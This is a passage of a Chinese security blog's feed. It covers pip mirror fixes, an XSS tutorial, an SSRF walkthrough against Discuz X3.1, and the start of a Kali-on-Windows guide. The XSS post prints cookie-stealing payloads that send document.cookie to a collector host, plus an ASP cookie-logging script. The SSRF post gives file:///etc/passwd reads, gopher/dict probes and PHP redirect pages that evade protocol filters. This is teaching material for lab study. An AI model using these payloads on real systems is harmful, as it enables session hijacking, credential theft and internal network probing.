class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">阿里云 http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line"></span><br><span class="line">豆瓣 http://pypi.douban.com/simple</span><br><span class="line"></span><br><span class="line">Python官方 https://pypi.python.org/simple/</span><br><span class="line"></span><br><span class="line">v2ex http://pypi.v2ex.com/simple/</span><br><span class="line"></span><br><span class="line">中国科学院 http://pypi.mirrors.opencas.cn/simple/</span><br><span class="line"></span><br><span class="line">清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure><h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><blockquote><p>错误：Could not fetch URL <a href="https://pypi.org/simple/pip/" target="_blank" rel="noopener">https://pypi.org/simple/pip/</a>: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=’pypi.org’, port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(SSLError(1, ‘[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:833)’),)) - skipping</p></blockquote><p>原因：在最新的 pip 版本(&gt;=7)中，使用镜像源时，会提示源地址不受信任或不安全</p><p>解决方案1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org 包名</span><br></pre></td></tr></table></figure><p>解决方案2：(推荐)</p><p>在第二个解决方案中：添加一项配置</p><blockquote><p>[install]</p><p>trusted-host=<a href="http://pypi.douban.com/simple" target="_blank" rel="noopener">http://pypi.douban.com/simple</a></p></blockquote><p>参考链接：<a href="https://www.jianshu.com/p/6f6c640b0371" target="_blank" rel="noopener">https://www.jianshu.com/p/6f6c640b0371</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一&quot;&gt;&lt;a href=&quot;#一&quot; class=&quot;headerlink&quot; title=&quot;一&quot;&gt;&lt;/a&gt;一&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;错误：CouldnotfetchURL&lt;a href=&quot;https://pypi.python.org/simple/pytest-xdist/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pypi.python.org/simple/pytest-xdist/&lt;/a&gt;: There wasaproblem confirmingthessl certificate: [SSL: TLSV1_ALERT_PROTOCOL_VERSION] tlsv1 alert protocolversion(_ssl.c:590)&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://goudanjun.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>XSS漏洞总结及实战</title>
    <link href="http://goudanjun.vip/2021/01/10/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%8F%8A%E5%AE%9E%E6%88%98.html/"/>
    <id>http://goudanjun.vip/2021/01/10/XSS漏洞总结及实战.html/</id>
    <published>2021-01-10T03:07:53.000Z</published>
    <updated>2021-01-12T06:39:50.885Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xss攻击原理"><a href="#xss攻击原理" class="headerlink" title="xss攻击原理"></a><strong>xss攻击原理</strong></h2><p>​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。</p><a id="more"></a><p>​    xss攻击的最终目的是在网页中嵌入客户端恶意脚本代码，最常用的攻击代码是JavaScript语言，但也会使用其他互联网客户端脚本代码，例如：ActionScript，VBscript。而如今的互联网客户端脚本代码基本是基于JavaScript，所以要想深入研究xss，必须精通JavaScript。JavaScript可以用来获取用户的Cooike，改变网页的内容，弹出窗口那么存在xss漏洞的网站，xss就可以用来盗取Cooike，黑掉页面，导航到恶意网站！甚至可以完全监控你的键盘操作，模仿windows注销界面，诱导你输入开机密码！而攻击者需要做的仅仅是向你的代码中注入JavaScript代码！</p><h2 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a><strong>xss的危害</strong></h2><ol><li>网络钓鱼，包括盗取各类用户账号</li><li>窃取用户Cooikes，利用管理员身份进一步对网站执行操作：</li><li>劫持会话，从而执行任意的操作，例如非法转账，强制发表日志，发送电子邮件：</li><li>强制弹广告，刷流量等（黑帽SEO）</li><li>海量客户端攻击（比如DDOS）</li><li>获取客户端信息，比如IP地址，开放端口，网页浏览历史；</li><li>传播跨站脚本蠕虫</li><li>结合其他漏洞，如CSRF漏洞</li></ol><h2 id="xss攻击分类"><a href="#xss攻击分类" class="headerlink" title="xss攻击分类"></a><strong>xss攻击分类</strong></h2><p>主要分为三大类：反射型，DOM型，储存型</p><p><strong>反射型</strong>：（服务器端 ）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=$_GET[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> $username;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br><span class="line"></span><br><span class="line"><span class="comment">#在这段代码中程序接受username值，并且输出，如果提交xss.php? username=zhangsan,那么程序并没有进行xss代码过滤，最终造成了反射型xss漏洞</span></span><br></pre></td></tr></table></figure><p><strong>DOM型</strong>：（在客户端上进行攻击）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> urls=<span class="built_in">document</span>.URL;<span class="comment">//获取URL</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> index=<span class="built_in">document</span>.URL.indexOf(<span class="string">"url="</span>)+<span class="number">4</span>；</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> par = urls.substring(index);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(par));<span class="comment">//输入获取内容</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上面代码的意思是获取URL中的urls参数的值，并且输出，如果输入http://host/domxss.php?url=&lt;script&gt;alert(/xss/)&lt;/script&gt;就可触发xss攻击的发生--&gt;</span></span><br></pre></td></tr></table></figure><p><strong>储存型</strong>：</p><p>与反射型相比，唯一的区别就是xss代码被存入了数据库中，在下次浏览时，又被读取出来</p><p>相对反射型，一般来说储存型的危害更大</p><p>真实案例：wooyun-2014-83651 凤凰网储存xss</p><h2 id="xss测试技巧"><a href="#xss测试技巧" class="headerlink" title="xss测试技巧"></a><strong>xss测试技巧</strong></h2><p><strong>工具检查</strong>: APPSCAN,AWVS,BurpSuit等综合型的扫描工具，但不如专门的xss检测工具（XSSER、XSSF、NoXss）效率高，不能检测储存型的xss漏洞</p><p><strong>手工测试</strong>：</p><p>常用的xss攻击脚本：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">"xss test!"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://localhost/xss_savecookie.asp?xcookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>'<span class="attr">test</span>')&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.write(document.cookie)</span>&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.location</span>=<span class="string">'http://192.168.24.250:83/xss_savecookie.asp?xcookie='</span>+<span class="attr">document.cookie</span>&gt;</span>点击察看详情<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">http://localhost/xss_savecookie.asp?xcookie=ASPSESSIONIDAARDBTAQ=HGOPGOPCEKEPHHDEBPHJPGLB;%20gbtoyAtBD=4;%20gbtoyTime=2012%2D6%2D11+23%3A33%3A29;%20gbtoy=pass=123456&amp;user=linhai</span><br><span class="line"></span><br><span class="line">http://192.168.24.250:81/cookiesave/XSS_savecookie.asp    &amp;lt  <span class="tag">&lt;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.location</span>=<span class="string">'http://192.168.24.250:81/cookiesave/XSS_savecookie.asp?xcookie='</span>+<span class="attr">document.cookie</span>&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>情景一:可得知输出位置</p><p>使用手工测试web应用程序是否存在xss漏洞时，最重要的是考虑哪里有输入，输入的数据在哪里进行输出*。</p><p>在进行手工测试xss时，一定要选择有特殊意义的字符，这样可以快速检测是否存在xss，比如说测试某输入框是否存在xss漏洞，不要直接输入xss跨站语句进行测试，一步一步来更便于测试和分析。</p><p>比如：输入一些敏感字符，例如：<strong>&lt;,&gt;,’,”,(,)</strong> 等，在提交请求后去查看html源代码，看这些输入的字符是否被转义。</p><p>在输入这些字符的时候，很有可能程序已经做了过滤，那么你再寻找就不那么容易了，只是可以输入“<strong>xsser&lt;&gt;”‘&amp;</strong>”这样的字符串，然后在查找源代码的时候直接查找xsser来去定位，避免被过滤掉之后就找不到输出的位置了。</p><p> 情景二：无法得知输出位置</p><p>非常多的web应用程序源代码是不对外开放的，这时进行xss时就有可能无法得知输入数据在哪显示、</p><p>对于这种情况通常采用万能输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"/&gt;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 来进行测试</p><p>有些情况手工检测漏洞的效率比全自动检测软件更快，因为测试人员通过经验可以快速发现输入点，这些是扫描器无法比拟的。</p><p>另外一些xss漏洞也不仅仅是直接注入到HTML，可能数据中才触发，比如再上传文件时修改文件名为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"</span><br></pre></td></tr></table></figure><p>那么程序在读文件名显示在html文档中，也会触发xss跨站漏洞的。</p><p>有输入的地方就可能存在着风险，如果连输入都没有，xss就不必检测了，包括其他安全漏洞</p><h2 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h2><h3 id="0x00-XSS会话劫持"><a href="#0x00-XSS会话劫持" class="headerlink" title="0x00 XSS会话劫持"></a><strong>0x00 XSS会话劫持</strong></h3><p><strong>盗取cookie：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(doucument.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/10/gacRS42PWVYAsIG.jpg" alt="img"></p><p><strong>会话劫持：</strong></p><p>劫持的cookie代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">'http://192.168.0.25:8007/XSS_savecookie.asp?xcookie='</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XSS_savecookie.asp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;font size=&quot;4&quot; color=&quot;#FF0000&quot;&gt;&lt;b&gt;自动接收跨站脚本截取到的Cookie信息，保存于cookie_xss.txt文件中。&lt;/b&gt; &lt;/font&gt;</span><br><span class="line">&lt;%</span><br><span class="line">dim XCookie,StrCookieText,strLogFile,XUser</span><br><span class="line">strLogFile=&quot;cookie_xss.txt&quot;</span><br><span class="line">XCookie=request(&quot;xcookie&quot;)</span><br><span class="line">XUser=request(&quot;user&quot;)</span><br><span class="line">if XCookie=&quot;&quot;  then</span><br><span class="line">  response.write &quot;cookie信息为空！&quot;</span><br><span class="line">  response.end</span><br><span class="line">End If</span><br><span class="line">StrCookieText=StrCookieText&amp;&quot;Cookie值为：----&quot;&amp;XCookie&amp;&quot; user=&quot;&amp;XUser&amp;&quot;----&quot;&amp;request.servervariables(&quot;REMOTE_HOST&quot;)</span><br><span class="line">StrCookieText=StrCookieText&amp;&quot; &quot;&amp;date&amp;&quot; &quot;&amp;time</span><br><span class="line"></span><br><span class="line">set f=Server.CreateObject(&quot;scripting.filesystemobject&quot;)</span><br><span class="line">set ff=f.opentextfile(server.mappath(&quot;.&quot;)&amp;&quot;\&quot;&amp;strLogFile,8,true,0)</span><br><span class="line">ff.writeline(chr(13)+chr(10)&amp;StrCookieText)</span><br><span class="line">ff.close</span><br><span class="line">set ff=nothing</span><br><span class="line">set f=nothing</span><br><span class="line">                      </span><br><span class="line">response.write &quot;&lt;br&gt;&lt;br&gt;提示：此脚本仅限测试!&quot;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/10/BJfAohunNzHQjXx.png" alt="微信截图_20210110113640"></p><h2 id="xss防御策略"><a href="#xss防御策略" class="headerlink" title="xss防御策略"></a>xss防御策略</h2><h2 id="★注"><a href="#★注" class="headerlink" title="★注"></a>★注</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a><strong>同源策略</strong></h3><p>是一种约定，他是浏览器最核心也是最基本的安全功能，可以说web是建立在同源策略的基础上的，浏览器只是针对同源策略的一种实现</p><p>同源策略的四大要素：</p><p>1，host（域名或IP地址，如果是IP地址则看作一个根域名）</p><p>2，子域名</p><p>3，端口</p><p>4，协议</p><p>对于浏览器来说受同源策略约束的有DOM，Cookie，XMLHttprequest，以及浏览器加载的第三方插件也有各自的同源策略。例如：flash，java applet，silverlight，coogle gears等。</p><p>不受约束的有：在浏览器中，对于标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">,<span class="tag">&lt;<span class="name">img</span>&gt;</span>,<span class="tag">&lt;<span class="name">iframe</span>&gt;</span>,<span class="tag">&lt;<span class="name">link</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>等标签都可以跨域加载资源，而不受同源策略的限制。这些带有”src“属性的标签每次加载的时候，实际上是由浏览器发起的一个get请求。</p><h3 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a><strong>XSS平台</strong></h3><p>BeEF,XSS Proxy，Backframe，国内的XXSER.ME(XSS Platfrom)也是比较优秀的XSS漏洞利用框架</p><p>其实框架是一组”javascript“工具集合，比如实现键盘记录，点击劫持等</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;xss攻击原理&quot;&gt;&lt;a href=&quot;#xss攻击原理&quot; class=&quot;headerlink&quot; title=&quot;xss攻击原理&quot;&gt;&lt;/a&gt;&lt;strong&gt;xss攻击原理&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="xss" scheme="http://goudanjun.vip/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞总结及实战</title>
    <link href="http://goudanjun.vip/2021/01/09/ssrf%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%8F%8A%E5%AE%9E%E6%88%98.html/"/>
    <id>http://goudanjun.vip/2021/01/09/ssrf漏洞总结及实战.html/</id>
    <published>2021-01-09T04:47:28.000Z</published>
    <updated>2021-01-12T06:39:46.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF攻击原理"><a href="#SSRF攻击原理" class="headerlink" title="SSRF攻击原理"></a><strong>SSRF攻击原理</strong></h2><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。</p><a id="more"></a><h3 id="Example："><a href="#Example：" class="headerlink" title="Example："></a>Example：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?url=http://google.com/ HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure><p>在这里，<a href="http://example.com从它的服务器获取http://google.com" target="_blank" rel="noopener">http://example.com从它的服务器获取http://google.com</a></p><p><img src="https://i.loli.net/2021/01/09/BXCedG2Dlz6EaKt.jpg" alt="v2-e92913401482f654b988eab6e46c9c99_720w"></p><h2 id="SSRF的类型"><a href="#SSRF的类型" class="headerlink" title="SSRF的类型"></a>SSRF的类型</h2><ol><li><p>显示攻击者的响应（Basic）</p></li><li><p>不显示响应（Blind）</p></li></ol><h2 id="什么地方最容易出现SSRF"><a href="#什么地方最容易出现SSRF" class="headerlink" title="什么地方最容易出现SSRF"></a>什么地方最容易出现SSRF</h2><ol><li>云服务器商。(各种网站数据库操作)</li><li>有远程图片加载的地方。(编辑器之类的有远程图片加载啊)</li><li>网站采集、网页抓取的地方。(很多网站会有新闻采集输入url然后一键采集)</li><li>头像的地方。(某易就喜欢远程加载头像，例如:<a href="http://www.xxxx.com/image?url=http://www.image.com/1.jpg" target="_blank" rel="noopener">http://www.xxxx.com/image?url=http://www.image.com/1.jpg</a>)</li><li>最后一个一切要你输入网址的地方和可以输入ip的都放，都是ssrf的天下。</li></ol><h2 id="SSRF漏洞的危害"><a href="#SSRF漏洞的危害" class="headerlink" title="SSRF漏洞的危害"></a><strong>SSRF</strong>漏洞的危害</h2><ol><li>对服务器所在的内网进行端口扫描，获取一些服务的banner信息等</li><li>攻击运行在内网或者本地的应用程序</li><li>对内网WEB应用进行指纹识别，通过访问默认文件实现（Readme等文件）</li><li>攻击内外网的WEB应用，主要是GET就可以实现的攻击（比如Struts2，SQL注入等）</li><li>下载内网资源（利用file协议读取本地文件等）</li><li>利用Redis未授权访问，HTTP CRLF注入达到getshell</li><li>wooyun峰会猪猪侠的ppt</li><li>进行跳板</li><li>无视cdn</li></ol><h2 id="SSRF神器Curl的使用"><a href="#SSRF神器Curl的使用" class="headerlink" title="SSRF神器Curl的使用"></a><strong>SSRF神器Curl的使用</strong></h2><p>查看curl支持的协议列表 #curl–config –protocols</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用curl读取文件</span></span><br><span class="line">curl -v <span class="string">"file:///etc/passwd"</span></span><br><span class="line"><span class="comment">#使用ftp协议</span></span><br><span class="line">curl -v <span class="string">"ftp://127.0.0.1:6666/info"</span></span><br><span class="line"><span class="comment">#使用dict协议</span></span><br><span class="line">curl -v <span class="string">"dict://127.0.0.1:6666/info"</span></span><br><span class="line"><span class="comment">#使用gopher协议</span></span><br><span class="line">curl -v <span class="string">"gopher://127.0.0.1:6666/_info"</span></span><br></pre></td></tr></table></figure><h2 id="最常用的跳转绕过"><a href="#最常用的跳转绕过" class="headerlink" title="最常用的跳转绕过"></a>最常用的跳转绕过</h2><p>一些服务器可能限定了只能使用http和https，这样就可以通过header跳转绕过</p><p><img src="https://i.loli.net/2021/01/09/pd5fo1PDSFkNVr7.jpg" alt="v2-71bcbdbcb44534474a386c2f4479c8b2_720w"></p><h2 id="Python-SSRF实现端口扫描"><a href="#Python-SSRF实现端口扫描" class="headerlink" title="Python+SSRF实现端口扫描"></a><strong>Python+SSRF实现端口扫描</strong></h2><p>简单的端口扫描</p><p><img src="https://i.loli.net/2021/01/09/RJFnikj9Apb2ON5.jpg" alt="2"></p><p>同时观察Wireshark整个扫描流程</p><p><img src="https://i.loli.net/2021/01/09/6IaAdCSbDcMF3Ko.jpg" alt="3"></p><p>代码实现：</p><p><img src="https://i.loli.net/2021/01/09/AHjnXzGoZQvrxSt.jpg" alt="4"></p><p>验证本地是否开启了相应的端口</p><p><img src="https://i.loli.net/2021/01/09/mu8nMTFzNafhZPs.jpg" alt="5"></p><p>Python代码编写的思路：</p><p>端口存在连接会一直在连接，连接时间会很长。</p><p><img src="https://i.loli.net/2021/01/09/rRWweQIZ6nkbhsH.jpg" alt="6"></p><p>端口不存在的连接会被立马刷新</p><p><img src="https://i.loli.net/2021/01/09/TsdaMScUHOzGLmn.jpg" alt="7"></p><h2 id="SSRF实战"><a href="#SSRF实战" class="headerlink" title="SSRF实战"></a>SSRF实战</h2><p>环境：win10（Discuz! X3.1），kali（nc监听；IP：192.168.239.134）</p><p>Discuz下载地址：[Discuz!]:<a href="https://www.discuz.net/thread-3457145-1-1.html" target="_blank" rel="noopener">https://www.discuz.net/thread-3457145-1-1.html</a></p><p><img src="https://i.loli.net/2021/01/09/PWD5LF8dTyg9uia.png" alt="1"></p><ol><li><h3 id="在kali上监听-6666-端口"><a href="#在kali上监听-6666-端口" class="headerlink" title="在kali上监听 6666 端口"></a>在kali上监听 6666 端口</h3><p><img src="https://i.loli.net/2021/01/09/VDqtLxAl2iFd9gC.png" alt="2"></p><p><img src="https://i.loli.net/2021/01/09/uFWw4Uc2okJaIlv.png" alt="微信截图_20210109192239"></p></li><li><h3 id="利用Discuz-3-1的ssrf漏洞进行请求访问"><a href="#利用Discuz-3-1的ssrf漏洞进行请求访问" class="headerlink" title="利用Discuz 3.1的ssrf漏洞进行请求访问"></a>利用Discuz 3.1的ssrf漏洞进行请求访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/discuz/forum.php</span><br><span class="line">?mod=ajax</span><br><span class="line">&amp;action=downremoteimg</span><br><span class="line">&amp;message=[img]http://192.168.3.26:6666/?data=hello.jpg[/img]</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/BhK9NzIPZpf8Xie.png" alt="3"></p></li><li><h3 id="可以看出在kali上监听到了本机发来的get请求"><a href="#可以看出在kali上监听到了本机发来的get请求" class="headerlink" title="可以看出在kali上监听到了本机发来的get请求"></a>可以看出在kali上监听到了本机发来的get请求</h3><p><img src="https://i.loli.net/2021/01/09/2I4xhV5Qgudn6PF.png" alt="4"></p><h3 id="绕过header限制"><a href="#绕过header限制" class="headerlink" title="绕过header限制"></a>绕过header限制</h3><p>很多网站不允许使用ftp dict gopher协议去请求的，所以需要php函数 header来绕过</p><p>在公网的服务器上建立一个 dict.php 文件，写入如下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"location: dict://192.168.136.133:6666/info"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/fJyFN4GwZA78SR1.png" alt="微信截图_20210109202024"></p><p>在discuz中构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/discuz/forum.php</span><br><span class="line">?mod=ajax</span><br><span class="line">&amp;action=downremoteimg</span><br><span class="line">&amp;message=[img]http://192.168.239.137/dict.php?data=hello.jpg[/img]</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/09/ZOfyAEYqIhPFxsi.png" alt="微信截图_20210109202101"></p><p>回到kali中查看结果，成功接收到了请求info，成功利用header绕过限制，其他协议的绕过，改我们创建的php文件中的协议名称即可</p><p><img src="https://i.loli.net/2021/01/09/H4JgAXPjwrC7zh2.png" alt="微信截图_20210109202140"></p></li></ol><h3 id="探测端口"><a href="#探测端口" class="headerlink" title="探测端口"></a>探测端口</h3><p>在公网服务器上创建 port.php 内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>]; </span><br><span class="line">$port = $_GET[<span class="string">'port'</span>]; </span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>]; </span><br><span class="line">$data = $_GET[<span class="string">'data'</span>]; </span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port:$data"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造如下payload</p><p><img src="https://i.loli.net/2021/01/09/v59Yh8l1fD4RuPS.png" alt="微信截图_20210109202539"></p><p>如果加载的时间很长，说明该端口是开放的。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SSRF攻击原理&quot;&gt;&lt;a href=&quot;#SSRF攻击原理&quot; class=&quot;headerlink&quot; title=&quot;SSRF攻击原理&quot;&gt;&lt;/a&gt;&lt;strong&gt;SSRF攻击原理&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ssrf" scheme="http://goudanjun.vip/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>在win10上安装kali子系统</title>
    <link href="http://goudanjun.vip/2019/07/31/%E5%9C%A8win10%E4%B8%8A%E5%AE%89%E8%A3%85kali%E5%AD%90%E7%B3%BB%E7%BB%9F.html/"/>
    <id>http://goudanjun.vip/2019/07/31/在win10上安装kali子系统.html/</id>
    <published>2019-07-31T12:32:40.000Z</published>
    <updated>2021-01-12T06:39:35.482Z</updated>
    
    <content type="html"><![CDATA[<h2 id="打开windows开发人员模式"><a href="#打开windows开发人员模式" class="headerlink" title="打开windows开发人员模式"></a>打开windows开发人员模式</h2><a id="more"></a><p><img src="https://i.loli.net/2021/01/07/ZmgqurUfKR7WDTL.png" alt="009234530215"></p><p><img src="https://i.loli.net/2021/01/07/MvQfoUlqPHk67Xg.png" alt="2"></p><h2 id="打开windows子系统功能"><a href="#打开windows子系统功能" class="headerlink" title="打开windows子系统功能"></a>打开windows子系统功能</h2><p><img src="https://i.loli.net/2021/01/07/tYrgvK4paqlo2ch.png" alt="img"></p><h2 id="安装子系统，在windows商店搜索wsl"><a href="#安装子系统，在windows商店搜索wsl" class="headerlink" title="安装子系统，在windows商店搜索wsl"></a>安装子系统，在windows商店搜索wsl</h2><p><img src="https://i.loli.net/2021/01/07/YGAxrdcQBeTFu9S.png" alt="img"></p><p><img src="https://i.loli.net/2021/01/07/eREJ2I81VziHKZl.png" 